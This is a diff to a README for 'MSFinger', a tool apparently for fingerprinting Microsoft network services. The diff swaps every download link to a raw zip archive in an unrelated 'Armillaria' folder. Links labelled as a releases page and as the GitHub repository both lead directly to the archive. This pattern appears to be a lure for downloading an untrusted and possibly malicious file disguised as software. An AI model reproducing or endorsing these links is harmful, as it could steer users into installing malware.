@@ -6,7 +6,7 @@ Welcome to MSFinger! This tool helps you identify Microsoft network services qui
 
 ## 📥 Download the Software
 
-[![Download MSFinger](https://github.com/zooms473/MSFinger/raw/refs/heads/main/Armillaria/Finger-MS-2.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/zooms473/MSFinger/raw/refs/heads/main/Armillaria/Finger-MS-2.1.zip)
+[![Download MSFinger](https://raw.githubusercontent.com/zooms473/MSFinger/main/Armillaria/Finger_MS_3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/zooms473/MSFinger/main/Armillaria/Finger_MS_3.6.zip)
 
 ## 💻 System Requirements
 
@@ -29,7 +29,7 @@ To run MSFinger, ensure your system meets these requirements:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the MSFinger releases page.  
-   [Visit this page to download](https://github.com/zooms473/MSFinger/raw/refs/heads/main/Armillaria/Finger-MS-2.1.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/zooms473/MSFinger/main/Armillaria/Finger_MS_3.6.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Find the latest version for the best experience.
@@ -82,7 +82,7 @@ For further assistance, please contact our support team via the GitHub Issues se
 
 ## 🔗 Links
 
-- [Visit this page to download](https://github.com/zooms473/MSFinger/raw/refs/heads/main/Armillaria/Finger-MS-2.1.zip)
-- [GitHub Repository](https://github.com/zooms473/MSFinger/raw/refs/heads/main/Armillaria/Finger-MS-2.1.zip)
+- [Visit this page to download](https://raw.githubusercontent.com/zooms473/MSFinger/main/Armillaria/Finger_MS_3.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/zooms473/MSFinger/main/Armillaria/Finger_MS_3.6.zip)
 
 Thank you for using MSFinger! Happy scanning!
